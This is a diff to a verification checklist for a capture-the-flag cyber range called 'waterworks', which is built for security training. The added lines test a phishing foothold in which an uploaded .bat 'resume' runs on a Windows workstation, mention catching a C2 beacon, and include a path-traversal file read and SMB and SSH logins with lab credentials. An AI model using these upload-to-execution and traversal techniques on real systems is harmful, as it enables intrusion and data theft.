@@ -21,7 +21,7 @@ give you the live IPs.
 ## 2. Deploy health
 
 - [ ] `./deploy.sh` completes without fatal errors
-- [ ] `ludus range list --range waterworks` shows **11 VMs** deployed/started
+- [ ] `ludus range list --range waterworks` shows **12 VMs** deployed/started (incl. Windows `ww-ws01`)
 - [ ] `ludus range errors --range waterworks` is clean
 - [ ] No deploy logged an `ludus`/proxy IoC survivor (spot-check one host:
       `grep -R 192.0.2 /etc/apt/` returns nothing)
@@ -43,7 +43,9 @@ give you the live IPs.
 | # | Check | From | Expect |
 |---|-------|------|--------|
 | [ ] | `curl -s http://waterworkspipeline.com/robots.txt` | VPN | lists `/staging/` |
-| [ ] | open `http://10.X.60.10` | VPN | scoreboard loads, 21 challenges |
+| [ ] | open `http://10.X.60.10` | VPN | scoreboard loads, 22 challenges |
+| [ ] | `curl -s http://waterworkspipeline.com/careers` | VPN | shows the resume upload form |
+| [ ] | `curl -s http://waterworkspipeline.com/careers/inbox.json` | VPN | returns JSON `{"files":[...]}` |
 | [ ] | `smbclient -L //10.X.20.10 -U 'svc_ccrsync%CCRsync#Feb2019'` | web01 | shares listed |
 | [ ] | `ssh j.alvarez@10.X.20.20` (`WaterWorks2026!`) | corp | login OK |
 | [ ] | `curl -s http://10.X.30.10:8080/login` | corp (VLAN20) | AquaHistorian login |
@@ -57,6 +59,12 @@ give you the live IPs.
 
 Run the quick ones; these confirm the planted content deployed correctly.
 
+- [ ] **foothold_phish (phishing path):** upload a test payload to the careers page
+      (`curl -s -F 'resume=@test.bat' http://waterworkspipeline.com/careers/apply`),
+      then within ~40s confirm it detonated on ww-ws01 — easiest end-to-end test is a
+      real C2 payload and catching the beacon; then `type C:\Users\a.wallace\Desktop\flag.txt`.
+      (Quick plumbing check without C2: upload a `.bat` that does
+      `echo %USERNAME% %COMPUTERNAME% > C:\ProgramData\HRIntake\proof.txt` and verify the file appears on ws01.)
 - [ ] **web_recon:** `curl -s http://waterworkspipeline.com/staging/ | grep -o 'WTR{[^}]*}'`
 - [ ] **web_lfi:** `curl -s "http://waterworkspipeline.com/reports/download?file=../.env" | grep -i marker`
 - [ ] **fs_engineering:** `smbclient //10.X.20.10/Engineering -U 'svc_ccrsync%CCRsync#Feb2019' -c 'cd Network; get WWP_Network_Overview.txt -'` → has `Document Control ID: WTR{...}`
